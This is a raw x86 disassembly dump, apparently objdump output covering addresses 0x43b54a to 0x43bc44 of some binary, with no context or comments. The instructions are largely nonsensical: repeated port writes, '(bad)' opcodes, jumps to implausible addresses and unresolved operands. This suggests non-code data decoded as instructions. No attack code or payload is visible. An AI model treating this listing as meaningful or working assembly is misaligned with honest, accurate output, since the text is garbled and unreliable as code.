  43b54a:	add    esp,DWORD PTR ds:0x2103e6f8
  43b550:	clc    
  43b551:	out    0x3,al
  43b553:	repnz (bad) 
  43b555:	out    0x3,al
  43b557:	idiv   dh
  43b559:	out    0x3,al
  43b55b:	cmp    bh,dh
  43b55d:	out    0x3,al
  43b55f:	cs (bad) 
  43b561:	out    0x3,al
  43b563:	or     eax,0x903e6f8
  43b568:	clc    
  43b569:	out    0x3,al
  43b56b:	add    eax,0x103e6f8
  43b570:	clc    
  43b571:	out    0x3,al
  43b573:	std    
  43b574:	mul    esi
  43b576:	add    edi,ecx
  43b578:	mul    esi
  43b57a:	add    esi,ebp
  43b57c:	mul    esi
  43b57e:	add    esi,ecx
  43b580:	mul    esi
  43b582:	add    eax,DWORD PTR [eax]
  43b584:	add    BYTE PTR [eax],al
  43b586:	add    BYTE PTR [eax],al
  43b588:	in     eax,dx
  43b589:	mul    esi
  43b58b:	add    ebp,ecx
  43b58d:	mul    esi
  43b58f:	add    edx,DWORD PTR [ebp+0x76e8fff7]
  43b595:	out    dx,al
  43b596:	add    al,0xe9
  43b598:	jbe    0x43b584
  43b59a:	add    al,0xe9
  43b59c:	jbe    0x43b594
  43b59e:	add    al,0xe9
  43b5a0:	jbe    0x43b594
  43b5a2:	add    al,0xe9
  43b5a4:	jbe    0x43b5a4
  43b5a6:	add    al,0xe9
  43b5a8:	jbe    0x43b5a4
  43b5aa:	add    al,0xe9
  43b5ac:	jbe    0x43b5b4
  43b5ae:	add    eax,0x50276e9
  43b5b3:	jmp    0xe949c42e
  43b5b8:	jbe    0x43b5c4
  43b5ba:	push   es
  43b5bb:	jmp    0xe949cc36
  43b5c0:	jbe    0x43b5d4
  43b5c2:	push   es
  43b5c3:	jmp    0xe949d43e
  43b5c8:	jbe    0x43b5e4
  43b5ca:	push   es
  43b5cb:	jmp    0xe949dc46
  43b5d0:	jbe    0x43b5e4
  43b5d2:	push   es
  43b5d3:	jmp    0xe949d44e
  43b5d8:	jbe    0x43b5f4
  43b5da:	push   es
  43b5db:	jmp    0xe949ec56
  43b5e0:	jbe    0x43b5a7
  43b5e2:	add    al,0xe9
  43b5e4:	jbe    0x43b624
  43b5e6:	push   es
  43b5e7:	jmp    0xe94e8662
  43b5ec:	add    BYTE PTR [eax],al
  43b5ee:	add    BYTE PTR [eax],al
  43b5f0:	add    BYTE PTR [esi-0x24],dh
  43b5f3:	or     ch,cl
  43b5f5:	jbe    0x43b629
  43b5f7:	push   es
  43b5f8:	jmp    0xe949f473
  43b5fd:	jbe    0x43b639
  43b5ff:	push   es
  43b600:	jmp    0xe94a0c7b
  43b605:	jbe    0x43b5ec
  43b607:	add    al,0xe9
  43b609:	jbe    0x43b661
  43b60b:	push   es
  43b60c:	jmp    0x525087
  43b611:	dec    esp
  43b612:	push   es
  43b613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b614:	or     cl,BYTE PTR [esi+eax*1-0x60]
  43b618:	or     bl,BYTE PTR [esi+eax*1-0x64]
  43b61c:	or     bl,BYTE PTR [esi+eax*1-0x68]
  43b620:	or     cl,BYTE PTR [esi+eax*1-0x6c]
  43b624:	or     cl,BYTE PTR [esi+eax*1-0x70]
  43b628:	or     bl,BYTE PTR [esi+eax*1]
  43b62b:	mov    WORD PTR [edx],cs
  43b62d:	sbb    al,0x6
  43b62f:	mov    BYTE PTR [edx],cl
  43b631:	or     al,0x6
  43b633:	test   BYTE PTR [edx],cl
  43b635:	or     al,0x6
  43b637:	or     BYTE PTR [edx],0x1c
  43b63a:	push   es
  43b63b:	mov    WORD PTR [edx],cs
  43b63d:	sbb    al,0x6
  43b63f:	in     al,dx
  43b640:	push   cs
  43b641:	or     al,0x6
  43b643:	je     0x43b64f
  43b645:	or     al,0x6
  43b647:	jo     0x43b653
  43b649:	fadd   QWORD PTR ds:0x5dc0a6c
  43b64f:	push   0x6405cc0a
  43b654:	or     al,BYTE PTR [eax]
  43b656:	add    BYTE PTR [eax],al
  43b658:	add    BYTE PTR [eax],al
  43b65a:	int3   
  43b65b:	add    eax,0x5dc0a60
  43b660:	pop    esp
  43b661:	or     bl,ah
  43b663:	add    eax,0x5cc0a58
  43b668:	push   esp
  43b669:	or     cl,ah
  43b66b:	add    eax,0x59c0a50
  43b670:	dec    esp
  43b671:	or     bl,BYTE PTR [ebp+eax*1+0x58c0a48]
  43b678:	ror    DWORD PTR [esi],1
  43b67a:	mov    WORD PTR ds:0x59c0a50,es
  43b680:	dec    esp
  43b681:	or     bl,BYTE PTR [ebp+eax*1+0x58c0a48]
  43b688:	inc    esp
  43b689:	or     cl,BYTE PTR [ebp+eax*1+0x1b750a40]
  43b690:	std    
  43b691:	cmp    edi,DWORD PTR [edi+0x1b]
  43b694:	std    
  43b695:	aaa    
  43b696:	outs   dx,DWORD PTR ds:[esi]
  43b697:	sbb    edi,ebp
  43b699:	xor    ebp,DWORD PTR [edi+0x1b]
  43b69c:	std    
  43b69d:	pop    ds
  43b69e:	jg     0x43b6bb
  43b6a0:	std    
  43b6a1:	sbb    edi,DWORD PTR [edi+0x1b]
  43b6a4:	std    
  43b6a5:	pop    ss
  43b6a6:	outs   dx,DWORD PTR ds:[esi]
  43b6a7:	sbb    edi,ebp
  43b6a9:	adc    ebp,DWORD PTR [edi+0x1b]
  43b6ac:	std    
  43b6ad:	movq   QWORD PTR [ebx],mm3
  43b6b0:	std    
  43b6b1:	or     edi,DWORD PTR [edi+0x1b]
  43b6b4:	std    
  43b6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b6b6:	outs   dx,BYTE PTR ds:[esi]
  43b6b7:	sbb    edi,ebp
  43b6b9:	add    ebp,DWORD PTR [edi+0x1b]
  43b6bc:	std    
  43b6bd:	inc    DWORD PTR [eax]
  43b6bf:	add    BYTE PTR [eax],al
  43b6c1:	add    BYTE PTR [eax],al
  43b6c3:	jg     0x43b6e0
  43b6c5:	std    
  43b6c6:	sti    
  43b6c7:	jl     0x43b6e4
  43b6c9:	std    
  43b6ca:	imul   DWORD PTR [ebx+ebx*1-0x3]
  43b6ce:	rep ins BYTE PTR es:[edi],dx
  43b6d0:	sbb    edi,ebp
  43b6d2:	out    dx,eax
  43b6d3:	jl     0x43b6f0
  43b6d5:	std    
  43b6d6:	jmp    0x43b754
  43b6d8:	sbb    edi,ebp
  43b6da:	out    0x6c,eax
  43b6dc:	sbb    edi,ebp
  43b6de:	jecxz  0x43b74c
  43b6e0:	sbb    edi,ebp
  43b6e2:	fistp  QWORD PTR [ebx+ebx*1-0x3]
  43b6e6:	fstp   TBYTE PTR [ebx+ebx*1-0x3]
  43b6ea:	xlat   BYTE PTR ds:[ebx]
  43b6eb:	ins    BYTE PTR es:[edi],dx
  43b6ec:	sbb    edi,ebp
  43b6ee:	shr    DWORD PTR [ebx+ebx*1-0x3],cl
  43b6f2:	iret   
  43b6f3:	jl     0x43b710
  43b6f5:	std    
  43b6f6:	retf   
  43b6f7:	jl     0x43b714
  43b6f9:	std    
  43b6fa:	data16 outs dx,BYTE PTR ds:[esi]
  43b6fc:	sbb    edi,ebp
  43b6fe:	ret    
  43b6ff:	ins    BYTE PTR es:[edi],dx
  43b700:	sbb    edi,ebp
  43b702:	mov    edi,0xbbfd1b7c
  43b707:	jl     0x43b724
  43b709:	std    
  43b70a:	mov    bh,0x6c
  43b70c:	add    ah,bh
  43b70e:	add    eax,ecx
  43b710:	cli    
  43b711:	out    0x3,al
  43b713:	and    eax,0x1903e6fa
  43b718:	cli    
  43b719:	out    0x3,al
  43b71b:	or     eax,0x1103e6fa
  43b720:	cli    
  43b721:	out    0x3,al
  43b723:	push   ecx
  43b724:	cld    
  43b725:	out    0x3,al
  43b727:	add    BYTE PTR [eax],al
  43b729:	add    BYTE PTR [eax],al
  43b72b:	add    cl,ch
  43b72d:	stc    
  43b72e:	out    0x3,al
  43b730:	(bad)  
  43b732:	out    0x3,al
  43b734:	loope  0x43b72f
  43b736:	out    0x3,al
  43b738:	add    eax,0xf903e6fa
  43b73d:	stc    
  43b73e:	out    0x3,al
  43b740:	in     eax,dx
  43b741:	stc    
  43b742:	out    0x3,al
  43b744:	icebp  
  43b745:	stc    
  43b746:	out    0x3,al
  43b748:	cmc    
  43b749:	stc    
  43b74a:	out    0x3,al
  43b74c:	mov    ecx,edi
  43b74e:	out    0x3,al
  43b750:	jge    0x43b74b
  43b752:	out    0x3,al
  43b754:	cmp    ecx,0xf96503e6
  43b75a:	out    0x3,al
  43b75c:	pop    ecx
  43b75d:	stc    
  43b75e:	out    0x3,al
  43b760:	dec    ebp
  43b761:	stc    
  43b762:	out    0x3,al
  43b764:	stos   DWORD PTR es:[edi],eax
  43b765:	sti    
  43b766:	out    0x3,al
  43b768:	push   ebp
  43b769:	stc    
  43b76a:	out    0x3,al
  43b76c:	sub    ecx,edi
  43b76e:	out    0x3,al
  43b770:	sbb    eax,0x2103e6f9
  43b775:	stc    
  43b776:	out    0x3,al
  43b778:	inc    ebp
  43b779:	stc    
  43b77a:	out    0x3,al
  43b77c:	cmp    ecx,edi
  43b77e:	out    0x3,al
  43b780:	sub    eax,0x3103e6f9
  43b785:	stc    
  43b786:	out    0x3,al
  43b788:	xor    eax,0x76e8fff9
  43b78d:	mov    BYTE PTR [esi],0xe9
  43b790:	add    BYTE PTR [eax],al
  43b792:	add    BYTE PTR [eax],al
  43b794:	add    BYTE PTR [esi-0x36],dh
  43b797:	push   es
  43b798:	jmp    0xe94a8613
  43b79d:	jbe    0x43b80b
  43b79f:	add    eax,0x57076e9
  43b7a4:	jmp    0xe9492c1f
  43b7a9:	jbe    0x43b823
  43b7ab:	add    eax,0x6cf76e9
  43b7b0:	jmp    0xe949382b
  43b7b5:	jbe    0x43b73b
  43b7b7:	add    eax,0x48876e9
  43b7bc:	jmp    0xe94a9737
  43b7c1:	jbe    0x43b7a6
  43b7c3:	push   es
  43b7c4:	jmp    0xe9484c3f
  43b7c9:	jbe    0x43b7b6
  43b7cb:	push   es
  43b7cc:	jmp    0xe9485447
  43b7d1:	jbe    0x43b773
  43b7d3:	add    al,0xe9
  43b7d5:	jbe    0x43b77b
  43b7d7:	add    al,0xe9
  43b7d9:	jbe    0x43b783
  43b7db:	add    al,0xe9
  43b7dd:	jbe    0x43b7f1
  43b7df:	or     cl,ch
  43b7e1:	jbe    0x43b7f9
  43b7e3:	or     cl,ch
  43b7e5:	jbe    0x43b801
  43b7e7:	or     cl,ch
  43b7e9:	jbe    0x43b7a3
  43b7eb:	add    al,0xe9
  43b7ed:	jbe    0x43b7fe
  43b7ef:	or     cl,ch
  43b7f1:	jbe    0x43b806
  43b7f3:	or     cl,ch
  43b7f5:	jbe    0x43b80e
  43b7f7:	or     cl,ch
  43b7f9:	add    BYTE PTR [eax],al
  43b7fb:	add    BYTE PTR [eax],al
  43b7fd:	add    BYTE PTR [esi+0x1b],dh
  43b800:	or     cl,ch
  43b802:	jbe    0x43b823
  43b804:	or     cl,ch
  43b806:	jbe    0x43b82b
  43b808:	or     cl,ch
  43b80a:	jbe    0x43b7e0
  43b80c:	add    al,0x0
  43b80e:	mov    WORD PTR [edx],es
  43b810:	sub    cl,BYTE PTR [ebx]
  43b812:	pushf  
  43b813:	add    dl,cl
  43b815:	or     BYTE PTR [edx+eax*1+0x28c08cd],bl
  43b81c:	leave  
  43b81d:	or     BYTE PTR [edx+eax*1+0x25c08c5],cl
  43b824:	push   ss
  43b825:	or     ebx,DWORD PTR [edx+eax*1+0x12]
  43b829:	or     ecx,DWORD PTR [edx+eax*1+0xe]
  43b82d:	or     ecx,DWORD PTR [edx+eax*1+0xa]
  43b831:	or     ebx,DWORD PTR [edx+eax*1-0x4f]
  43b835:	or     BYTE PTR [edx+eax*1-0x53],bl
  43b839:	or     BYTE PTR [edx+eax*1-0x57],cl
  43b83d:	or     BYTE PTR [edx+eax*1-0x5b],cl
  43b841:	or     BYTE PTR [edx+eax*1],bl
  43b844:	mov    eax,ds:0x9d021c08
  43b849:	or     BYTE PTR [edx+eax*1],cl
  43b84c:	out    dx,al
  43b84d:	or     cl,BYTE PTR [edx+eax*1]
  43b850:	xchg   ebp,eax
  43b851:	or     BYTE PTR [edx+eax*1],bl
  43b854:	xchg   ecx,eax
  43b855:	or     BYTE PTR [edx+eax*1],bl
  43b858:	lea    ecx,[eax]
  43b85a:	or     al,0x2
  43b85c:	mov    DWORD PTR [eax],ecx
  43b85e:	or     al,0x2
  43b860:	test   DWORD PTR [eax],ecx
  43b862:	add    BYTE PTR [eax],al
  43b864:	add    BYTE PTR [eax],al
  43b866:	add    ah,bl
  43b868:	add    DWORD PTR [ecx+0x7d01dc08],eax
  43b86e:	or     ah,cl
  43b870:	add    DWORD PTR [ecx+0x8],edi
  43b873:	int3   
  43b874:	add    DWORD PTR [ebp+0x8],esi
  43b877:	fadd   QWORD PTR [ecx]
  43b879:	jno    0x43b883
  43b87b:	fadd   QWORD PTR [ecx]
  43b87d:	ins    DWORD PTR es:[edi],dx
  43b87e:	or     ah,cl
  43b880:	add    DWORD PTR [esi-0x45fe33f6],edi
  43b886:	or     bl,BYTE PTR [ecx+eax*1+0x1b750ab6]
  43b88d:	std    
  43b88e:	mov    ch,0x6f
  43b890:	sbb    edi,ebp
  43b892:	mov    cl,0x6f
  43b894:	sbb    edi,ebp
  43b896:	lods   eax,DWORD PTR ds:[esi]
  43b897:	jg     0x43b8b4
  43b899:	std    
  43b89a:	test   eax,0xa5fd1b7f
  43b89f:	outs   dx,DWORD PTR ds:[esi]
  43b8a0:	sbb    edi,ebp
  43b8a2:	mov    eax,ds:0x9dfd1b6f
  43b8a7:	jg     0x43b8c4
  43b8a9:	std    
  43b8aa:	cdq    
  43b8ab:	jg     0x43b8c8
  43b8ad:	std    
  43b8ae:	xchg   ebp,eax
  43b8af:	outs   dx,DWORD PTR ds:[esi]
  43b8b0:	sbb    edi,ebp
  43b8b2:	xchg   ecx,eax
  43b8b3:	outs   dx,DWORD PTR ds:[esi]
  43b8b4:	sbb    edi,ebp
  43b8b6:	lea    edi,[edi+0x1b]
  43b8b9:	std    
  43b8ba:	mov    DWORD PTR [edi+0x1b],edi
  43b8bd:	std    
  43b8be:	test   DWORD PTR [edi+0x1b],ebp
  43b8c1:	std    
  43b8c2:	sub    DWORD PTR [edi+0x1b],0x1b7f7dfd
  43b8c9:	std    
  43b8ca:	jns    0x43b8cc
  43b8cc:	add    BYTE PTR [eax],al
  43b8ce:	add    BYTE PTR [eax],al
  43b8d0:	jg     0x43b8ed
  43b8d2:	std    
  43b8d3:	jne    0x43b944
  43b8d5:	sbb    edi,ebp
  43b8d7:	jno    0x43b948
  43b8d9:	sbb    edi,ebp
  43b8db:	ins    DWORD PTR es:[edi],dx
  43b8dc:	jg     0x43b8f9
  43b8de:	std    
  43b8df:	imul   edi,DWORD PTR [edi+0x1b],0x1b6f65fd
  43b8e6:	std    
  43b8e7:	popa   
  43b8e8:	outs   dx,DWORD PTR ds:[esi]
  43b8e9:	sbb    edi,ebp
  43b8eb:	pop    ebp
  43b8ec:	jg     0x43b909
  43b8ee:	std    
  43b8ef:	pop    ecx
  43b8f0:	jg     0x43b90d
  43b8f2:	std    
  43b8f3:	push   ebp
  43b8f4:	outs   dx,DWORD PTR ds:[esi]
  43b8f5:	sbb    edi,ebp
  43b8f7:	push   ecx
  43b8f8:	outs   dx,DWORD PTR ds:[esi]
  43b8f9:	sbb    edi,ebp
  43b8fb:	dec    ebp
  43b8fc:	jg     0x43b919
  43b8fe:	std    
  43b8ff:	dec    ecx
  43b900:	jg     0x43b91d
  43b902:	std    
  43b903:	inc    ebp
  43b904:	outs   dx,DWORD PTR ds:[esi]
  43b905:	sbb    edi,ebp
  43b907:	inc    ecx
  43b908:	outs   dx,DWORD PTR ds:[esi]
  43b909:	add    ah,bh
  43b90b:	add    esi,DWORD PTR [ebx-0x8]
  43b90e:	out    0x3,al
  43b910:	outs   dx,DWORD PTR ds:[esi]
  43b911:	clc    
  43b912:	out    0x3,al
  43b914:	imul   edi,eax,0xffffffe6
  43b917:	add    esp,DWORD PTR [edi-0x8]
  43b91a:	out    0x3,al
  43b91c:	arpl   ax,di
  43b91e:	out    0x3,al
  43b920:	pop    edi
  43b921:	clc    
  43b922:	out    0x3,al
  43b924:	pop    ebx
  43b925:	clc    
  43b926:	out    0x3,al
  43b928:	push   edi
  43b929:	clc    
  43b92a:	out    0x3,al
  43b92c:	xchg   ebx,eax
  43b92d:	clc    
  43b92e:	out    0x3,al
  43b930:	(bad)  
  43b931:	clc    
  43b932:	out    0x3,al
  43b934:	add    BYTE PTR [eax],al
  43b936:	add    BYTE PTR [eax],al
  43b938:	add    BYTE PTR [ebx-0x78fc1908],cl
  43b93e:	clc    
  43b93f:	out    0x3,al
  43b941:	cmp    eax,0xffffffe6
  43b944:	add    edi,DWORD PTR [edi-0x8]
  43b947:	out    0x3,al
  43b949:	jnp    0x43b943
  43b94b:	out    0x3,al
  43b94d:	ja     0x43b947
  43b94f:	out    0x3,al
  43b951:	xor    edi,edx
  43b953:	out    0x3,al
  43b955:	das    
  43b956:	cli    
  43b957:	out    0x3,al
  43b959:	sub    edi,edx
  43b95b:	out    0x3,al
  43b95d:	daa    
  43b95e:	cli    
  43b95f:	out    0x3,al
  43b961:	and    edi,edx
  43b963:	out    0x3,al
  43b965:	pop    ds
  43b966:	cli    
  43b967:	out    0x3,al
  43b969:	sbb    edi,edx
  43b96b:	out    0x3,al
  43b96d:	pop    ss
  43b96e:	cli    
  43b96f:	out    0x3,al
  43b971:	sar    ecx,cl
  43b973:	out    0x3,al
  43b975:	iret   
  43b976:	stc    
  43b977:	out    0x3,al
  43b979:	retf   
  43b97a:	stc    
  43b97b:	out    0x3,al
  43b97d:	(bad)  
  43b97e:	stc    
  43b97f:	out    0x3,al
  43b981:	ret    
  43b982:	stc    
  43b983:	out    0x3,al
  43b985:	mov    edi,0x76e8fff9
  43b98a:	cmp    al,0x7
  43b98c:	jmp    0xe94afa07
  43b991:	jbe    0x43b9d7
  43b993:	pop    es
  43b994:	jmp    0xe94b020f
  43b999:	jbe    0x43b9e7
  43b99b:	pop    es
  43b99c:	jmp    0x43b9a1
  43b9a1:	add    BYTE PTR [esi+0x50],dh
  43b9a4:	pop    es
  43b9a5:	jmp    0xe94b0e20
  43b9aa:	jbe    0x43ba04
  43b9ac:	pop    es
  43b9ad:	jmp    0xe94b1628
  43b9b2:	jbe    0x43ba14
  43b9b4:	pop    es
  43b9b5:	jmp    0xe94b1e30
  43b9ba:	jbe    0x43ba24
  43b9bc:	pop    es
  43b9bd:	jmp    0xe94b2638
  43b9c2:	jbe    0x43ba34
  43b9c4:	pop    es
  43b9c5:	jmp    0xe94b2e40
  43b9ca:	jbe    0x43ba44
  43b9cc:	pop    es
  43b9cd:	jmp    0xe94b3648
  43b9d2:	jbe    0x43b954
  43b9d4:	pop    es
  43b9d5:	jmp    0xe94a3e50
  43b9da:	jbe    0x43b964
  43b9dc:	push   es
  43b9dd:	jmp    0xe94a4658
  43b9e2:	jbe    0x43b974
  43b9e4:	push   es
  43b9e5:	jmp    0xe94a4e60
  43b9ea:	jbe    0x43b984
  43b9ec:	push   es
  43b9ed:	jmp    0xe94a5668
  43b9f2:	jbe    0x43b994
  43b9f4:	push   es
  43b9f5:	jmp    0xe94a5e70
  43b9fa:	jbe    0x43b9a4
  43b9fc:	push   es
  43b9fd:	jmp    0xe94a6678
  43ba02:	jbe    0x43b9b4
  43ba04:	push   es
  43ba05:	add    BYTE PTR [eax],al
  43ba07:	add    BYTE PTR [eax],al
  43ba09:	add    BYTE PTR [eax],al
  43ba0b:	fdiv   st(6),st
  43ba0d:	dec    ecx
  43ba0e:	or     esp,ebx
  43ba10:	inc    BYTE PTR [ebp+0x9]
  43ba13:	int3   
  43ba14:	inc    BYTE PTR [ecx+0x9]
  43ba17:	int3   
  43ba18:	(bad)  
  43ba19:	cmp    eax,0x39fe9c09
  43ba1e:	or     DWORD PTR [esi+edi*8-0x173f6cb],ebx
  43ba25:	xor    DWORD PTR [ecx],ecx
  43ba27:	mov    esi,?
  43ba29:	sub    eax,0x29fe9c09
  43ba2e:	or     DWORD PTR [esi+edi*8-0x173f6db],ebx
  43ba35:	and    DWORD PTR [ecx],ecx
  43ba37:	mov    esi,?
  43ba39:	sbb    eax,0x1a065c09
  43ba3e:	or     DWORD PTR [esi+eax*1+0x16],ebx
  43ba42:	or     DWORD PTR [esi+eax*1+0x12],ecx
  43ba46:	or     DWORD PTR [esi+eax*1+0xe],ecx
  43ba4a:	or     DWORD PTR [esi+eax*1+0xa],ebx
  43ba4e:	or     DWORD PTR [esi+eax*1+0x6],ebx
  43ba52:	or     DWORD PTR [esi+eax*1+0x2],ecx
  43ba56:	or     DWORD PTR [esi+eax*1-0x2],ecx
  43ba5a:	or     BYTE PTR [esi+eax*1],bl
  43ba5d:	cli    
  43ba5e:	or     BYTE PTR [esi+eax*1],bl
  43ba61:	test   BYTE PTR [eax],0xc
  43ba64:	push   es
  43ba65:	repnz or BYTE PTR [esi+eax*1],cl
  43ba69:	out    dx,al
  43ba6a:	or     BYTE PTR [esi+eax*1],bl
  43ba6d:	jmp    0x0:0x8
  43ba74:	sbb    al,0x6
  43ba76:	out    0x8,al
  43ba78:	or     al,0x6
  43ba7a:	loop   0x43ba84
  43ba7c:	or     al,0x6
  43ba7e:	fimul  WORD PTR [eax]
  43ba80:	fadd   QWORD PTR ds:0x5dc08da
  43ba86:	(bad)  
  43ba87:	or     BYTE PTR [ebp-0x15],dh
  43ba8a:	cld    
  43ba8b:	aad    0x6d
  43ba8d:	jmp    0x43ba8b
  43ba8f:	sar    DWORD PTR [ebp-0x15],1
  43ba92:	cld    
  43ba93:	int    0x7d
  43ba95:	jmp    0x43ba93
  43ba97:	leave  
  43ba98:	ins    DWORD PTR es:[edi],dx
  43ba99:	jmp    0x43ba97
  43ba9b:	lds    ebp,FWORD PTR [ebp-0x15]
  43ba9e:	cld    
  43ba9f:	sar    DWORD PTR [ebp-0x15],0xfc
  43baa3:	mov    ebp,0xb9fceb7d
  43baa8:	ins    DWORD PTR es:[edi],dx
  43baa9:	jmp    0x43baa7
  43baab:	mov    ch,0x6d
  43baad:	jmp    0x43baab
  43baaf:	mov    cl,0x7d
  43bab1:	jmp    0x43baaf
  43bab3:	lods   eax,DWORD PTR ds:[esi]
  43bab4:	jge    0x43baa1
  43bab6:	cld    
  43bab7:	test   eax,0xa5fceb6d
  43babc:	ins    DWORD PTR es:[edi],dx
  43babd:	jmp    0x43babb
  43babf:	mov    eax,ds:0x9dfceb7d
  43bac4:	jge    0x43bab1
  43bac6:	cld    
  43bac7:	cdq    
  43bac8:	ins    DWORD PTR es:[edi],dx
  43bac9:	jmp    0x43bac7
  43bacb:	xchg   ebp,eax
  43bacc:	ins    DWORD PTR es:[edi],dx
  43bacd:	jmp    0x43bacb
  43bacf:	xchg   ecx,eax
  43bad0:	jge    0x43babd
  43bad2:	cld    
  43bad3:	lea    edi,[ebp-0x15]
  43bad6:	cld    
  43bad7:	mov    DWORD PTR [eax],eax
  43bad9:	add    BYTE PTR [eax],al
  43badb:	add    BYTE PTR [eax],al
  43badd:	ins    DWORD PTR es:[edi],dx
  43bade:	jmp    0x43badc
  43bae0:	test   DWORD PTR [ebp-0x15],ebp
  43bae3:	cld    
  43bae4:	cmp    DWORD PTR [ebp-0x15],0xeb7d7dfc
  43baeb:	cld    
  43baec:	jns    0x43bb5b
  43baee:	jmp    0x43baec
  43baf0:	jne    0x43bb5f
  43baf2:	jmp    0x43baf0
  43baf4:	jno    0x43bb73
  43baf6:	jmp    0x43baf4
  43baf8:	ins    DWORD PTR es:[edi],dx
  43baf9:	jge    0x43bae6
  43bafb:	cld    
  43bafc:	imul   ebp,DWORD PTR [ebp-0x15],0xeb6d65fc
  43bb03:	cld    
  43bb04:	popa   
  43bb05:	jge    0x43bb09
  43bb07:	out    0x3,eax
  43bb09:	dec    ebx
  43bb0a:	or     ah,bh
  43bb0c:	add    edi,DWORD PTR [edi]
  43bb0e:	or     ah,bh
  43bb10:	add    eax,DWORD PTR [ebx+0xa]
  43bb13:	out    0x3,eax
  43bb15:	daa    
  43bb16:	or     ah,bh
  43bb18:	add    edi,DWORD PTR [ebx]
  43bb1a:	or     ah,bh
  43bb1c:	add    ebp,DWORD PTR [edi]
  43bb1e:	or     ah,bh
  43bb20:	add    esi,DWORD PTR [ebx]
  43bb22:	or     ah,bh
  43bb24:	add    esi,DWORD PTR [edi]
  43bb26:	or     ah,bh
  43bb28:	add    ebp,DWORD PTR [ebx+0xa]
  43bb2b:	out    0x3,eax
  43bb2d:	pop    edi
  43bb2e:	or     ah,bh
  43bb30:	add    esp,DWORD PTR [ebx+0xa]
  43bb33:	out    0x3,eax
  43bb35:	inc    edi
  43bb36:	or     ah,bh
  43bb38:	add    ebx,DWORD PTR [ebx+0xa]
  43bb3b:	out    0x3,eax
  43bb3d:	dec    edi
  43bb3e:	or     ah,bh
  43bb40:	add    eax,DWORD PTR [eax]
  43bb42:	add    BYTE PTR [eax],al
  43bb44:	add    BYTE PTR [eax],al
  43bb46:	push   ebx
  43bb47:	or     ah,bh
  43bb49:	add    edx,DWORD PTR [edi-0x74fc18f6]
  43bb4f:	or     ah,bh
  43bb51:	add    edi,DWORD PTR [edi+0xa]
  43bb54:	out    0x3,eax
  43bb56:	or     DWORD PTR [edx],0xffffffe7
  43bb59:	add    esp,DWORD PTR [edi+0xa]
  43bb5c:	out    0x3,eax
  43bb5e:	jnp    0x43bb6a
  43bb60:	out    0x3,eax
  43bb62:	mov    WORD PTR [edi],es
  43bb64:	out    0x3,eax
  43bb66:	nop
  43bb67:	pop    es
  43bb68:	out    0x3,eax
  43bb6a:	ja     0x43bb76
  43bb6c:	out    0x3,eax
  43bb6e:	sub    ecx,DWORD PTR [eax]
  43bb70:	out    0x3,eax
  43bb72:	pop    ds
  43bb73:	or     bh,ah
  43bb75:	add    esp,DWORD PTR [ebx]
  43bb77:	or     bh,ah
  43bb79:	add    eax,DWORD PTR [edi]
  43bb7b:	or     bh,ah
  43bb7d:	add    ebx,DWORD PTR [ebx]
  43bb7f:	or     bh,ah
  43bb81:	add    ecx,DWORD PTR [edi]
  43bb83:	or     BYTE PTR [eax],al
  43bb85:	jmp    0xe944a400
  43bb8a:	jbe    0x43bb70
  43bb8c:	add    cl,ch
  43bb8e:	jbe    0x43bb70
  43bb90:	add    cl,ch
  43bb92:	jbe    0x43bb70
  43bb94:	add    cl,ch
  43bb96:	jbe    0x43bb70
  43bb98:	add    cl,ch
  43bb9a:	jbe    0x43bb70
  43bb9c:	add    cl,ch
  43bb9e:	jbe    0x43bb70
  43bba0:	add    cl,ch
  43bba2:	jbe    0x43bb70
  43bba4:	add    cl,ch
  43bba6:	jbe    0x43bb70
  43bba8:	add    cl,ch
  43bbaa:	add    BYTE PTR [eax],al
  43bbac:	add    BYTE PTR [eax],al
  43bbae:	add    BYTE PTR [esi-0x3c],dh
  43bbb1:	add    cl,ch
  43bbb3:	jbe    0x43bb75
  43bbb5:	add    cl,ch
  43bbb7:	jbe    0x43bb75
  43bbb9:	add    cl,ch
  43bbbb:	jbe    0x43bb75
  43bbbd:	add    cl,ch
  43bbbf:	jbe    0x43bb75
  43bbc1:	add    cl,ch
  43bbc3:	jbe    0x43bb75
  43bbc5:	add    cl,ch
  43bbc7:	jbe    0x43bc2e
  43bbc9:	add    ebp,ecx
  43bbcb:	jbe    0x43bc2e
  43bbcd:	add    ebp,ecx
  43bbcf:	jbe    0x43bc2e
  43bbd1:	add    ebp,ecx
  43bbd3:	jbe    0x43bc2e
  43bbd5:	add    ebp,ecx
  43bbd7:	jbe    0x43bc2e
  43bbd9:	add    ebp,ecx
  43bbdb:	jbe    0x43bc2e
  43bbdd:	add    ebp,ecx
  43bbdf:	jbe    0x43bc2e
  43bbe1:	add    ebp,ecx
  43bbe3:	jbe    0x43bc0b
  43bbe5:	add    ebp,ecx
  43bbe7:	jbe    0x43bb75
  43bbe9:	add    cl,ch
  43bbeb:	jbe    0x43bb75
  43bbed:	add    cl,ch
  43bbef:	jbe    0x43bb75
  43bbf1:	add    cl,ch
  43bbf3:	jbe    0x43bb75
  43bbf5:	add    ecx,ebp
  43bbf7:	jbe    0x43bc2e
  43bbf9:	add    ebp,ecx
  43bbfb:	jbe    0x43bc2e
  43bbfd:	add    ebp,ecx
  43bbff:	jbe    0x43bc2e
  43bc01:	add    eax,DWORD PTR [eax]
  43bc03:	sbb    al,0x3
  43bc05:	daa    
  43bc06:	add    eax,0x766030c
  43bc0b:	or     al,0x3
  43bc0d:	bound  eax,QWORD PTR [edi]
  43bc0f:	fadd   QWORD PTR [edx]
  43bc11:	pop    esi
  43bc12:	pop    es
  43bc13:	add    BYTE PTR [eax],al
  43bc15:	add    BYTE PTR [eax],al
  43bc17:	add    ah,bl
  43bc19:	add    bl,BYTE PTR [edx+0x7]
  43bc1c:	int3   
  43bc1d:	add    dl,BYTE PTR [esi+0x7]
  43bc20:	int3   
  43bc21:	add    dl,BYTE PTR [edx+0x7]
  43bc24:	fadd   QWORD PTR [edx]
  43bc26:	dec    esi
  43bc27:	pop    es
  43bc28:	fadd   QWORD PTR [edx]
  43bc2a:	dec    edx
  43bc2b:	pop    es
  43bc2c:	int3   
  43bc2d:	add    al,BYTE PTR [ebx]
  43bc2f:	add    eax,0x4ff02cc
  43bc34:	pushf  
  43bc35:	add    bh,bl
  43bc37:	add    al,0x9c
  43bc39:	add    bh,BYTE PTR [edx]
  43bc3b:	pop    es
  43bc3c:	mov    WORD PTR [edx],es
  43bc3e:	ss pop es
  43bc40:	mov    WORD PTR [edx],es
  43bc42:	xor    al,BYTE PTR [edi]
  43bc44:	pushf  
